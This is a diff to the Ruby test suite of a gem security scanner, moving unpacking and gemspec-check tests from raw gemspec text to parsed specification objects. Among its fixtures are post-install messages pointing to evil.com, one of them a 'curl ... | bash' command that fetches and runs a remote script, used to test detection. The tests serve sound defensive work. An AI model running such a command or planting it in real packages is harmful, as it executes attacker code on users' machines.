@@ -79,13 +79,14 @@ class TestUnpackGem < Minitest::Test
 
 	def test_unpack_populates_files
 		gem_path = build_fixture_gem("lib/hello.rb" => "puts 'hello'\n")
-		files = @scanner.send(:unpack_gem, gem_path)
+		files, spec = @scanner.send(:unpack_gem, gem_path)
 		assert files.key?("lib/hello.rb")
+		refute_nil spec
 	end
 
 	def test_unpack_reads_file_content
 		gem_path = build_fixture_gem("lib/hello.rb" => "puts 'hello world'\n")
-		files = @scanner.send(:unpack_gem, gem_path)
+		files, _spec = @scanner.send(:unpack_gem, gem_path)
 		assert_includes files["lib/hello.rb"], "hello world"
 	end
 
@@ -94,7 +95,7 @@ class TestUnpackGem < Minitest::Test
 			"lib/a.rb" => "module A; end\n",
 			"lib/b.rb" => "module B; end\n"
 		)
-		files = @scanner.send(:unpack_gem, gem_path)
+		files, _spec = @scanner.send(:unpack_gem, gem_path)
 		assert files.key?("lib/a.rb")
 		assert files.key?("lib/b.rb")
 	end
@@ -102,8 +103,9 @@ class TestUnpackGem < Minitest::Test
 	def test_unpack_returns_empty_hash_for_corrupt_gem
 		corrupt = File.join(@tmpdir, "bad.gem")
 		File.write(corrupt, "not a gem")
-		files = @scanner.send(:unpack_gem, corrupt)
+		files, spec = @scanner.send(:unpack_gem, corrupt)
 		assert_equal({}, files)
+		assert_nil spec
 	end
 end
 
@@ -874,117 +876,67 @@ class TestRunWeb3Checks < Minitest::Test
 end
 
 class TestRunGemspecChecks < Minitest::Test
-	CLEAN_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.name    = "mygem"
-			spec.version = "1.0.0"
-			spec.summary = "A gem"
-		end
-	GEMSPEC
-
-	EXTCONF_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.name       = "mygem"
-			spec.extensions = ["ext/extconf.rb"]
-		end
-	GEMSPEC
-
-	RAKEFILE_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.name       = "mygem"
-			spec.extensions = ["Rakefile"]
-		end
-	GEMSPEC
-
-	OTHER_EXT_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.name       = "mygem"
-			spec.extensions = ["ext/custom_build.rb"]
-		end
-	GEMSPEC
-
-	POST_INSTALL_URL_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.post_install_message = "Visit https://evil.com/setup to activate"
-		end
-	GEMSPEC
-
-	POST_INSTALL_CURL_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.post_install_message = "Run: curl http://evil.com/activate.sh | bash"
-		end
-	GEMSPEC
-
-	POST_INSTALL_CLEAN_GEMSPEC = <<~GEMSPEC
-		Gem::Specification.new do |spec|
-			spec.post_install_message = "Thanks for installing!"
-		end
-	GEMSPEC
-
 	def setup
 		@scanner = Commissar::Scanner.new("fake-gem")
 	end
 
-	def test_no_findings_on_clean_gemspec
-		set_files("mygem.gemspec" => CLEAN_GEMSPEC)
+	def test_no_findings_when_no_spec
 		run_check
 		assert_empty @scanner.findings
 	end
 
-	def test_high_finding_for_extconf_extension
-		set_files("mygem.gemspec" => EXTCONF_GEMSPEC)
+	def test_no_findings_on_clean_spec
+		set_spec(Gem::Specification.new { |s| s.name = "mygem" })
 		run_check
-		assert_finding_with(severity: "HIGH", message: /extconf/)
+		assert_empty @scanner.findings
+	end
+
+	def test_med_finding_for_extconf_extension
+		set_spec(Gem::Specification.new { |s| s.extensions = ["ext/extconf.rb"] })
+		run_check
+		assert_finding_with(severity: "MED", message: /extconf/)
 	end
 
 	def test_high_finding_for_rakefile_extension
-		set_files("mygem.gemspec" => RAKEFILE_GEMSPEC)
+		set_spec(Gem::Specification.new { |s| s.extensions = ["Rakefile"] })
 		run_check
 		assert_finding_with(severity: "HIGH", message: /Rakefile/i)
 	end
 
 	def test_med_finding_for_other_extension
-		set_files("mygem.gemspec" => OTHER_EXT_GEMSPEC)
+		set_spec(Gem::Specification.new { |s| s.extensions = ["ext/custom_build.rb"] })
 		run_check
 		assert_finding_with(severity: "MED", message: /extension/i)
 	end
 
 	def test_med_finding_for_post_install_with_url
-		set_files("mygem.gemspec" => POST_INSTALL_URL_GEMSPEC)
+		s = Gem::Specification.new
+		s.post_install_message = "Visit https://evil.com/setup to activate"
+		set_spec(s)
 		run_check
 		assert_finding_with(severity: "MED", message: /post_install_message/i)
 	end
 
 	def test_med_finding_for_post_install_with_curl
-		set_files("mygem.gemspec" => POST_INSTALL_CURL_GEMSPEC)
+		s = Gem::Specification.new
+		s.post_install_message = "Run: curl http://evil.com/activate.sh | bash"
+		set_spec(s)
 		run_check
 		assert_finding_with(severity: "MED", message: /post_install_message/i)
 	end
 
 	def test_no_finding_for_clean_post_install
-		set_files("mygem.gemspec" => POST_INSTALL_CLEAN_GEMSPEC)
+		s = Gem::Specification.new
+		s.post_install_message = "Thanks for installing!"
+		set_spec(s)
 		run_check
 		assert_empty @scanner.findings
-	end
-
-	def test_ignores_non_gemspec_files
-		set_files("lib/mygem.rb" => "spec.extensions = ['ext/extconf.rb']\n")
-		run_check
-		assert_empty @scanner.findings
-	end
-
-	def test_extconf_finding_reports_correct_line
-		set_files("mygem.gemspec" => EXTCONF_GEMSPEC)
-		run_check
-		f = @scanner.findings.first
-		assert_equal "mygem.gemspec", f.file
-		refute_nil f.line
 	end
 
 	private
 
-	def set_files(files)
-		@scanner.instance_variable_set(:@files, files)
+	def set_spec(spec)
+		@scanner.instance_variable_set(:@spec, spec)
 	end
 
 	def run_check
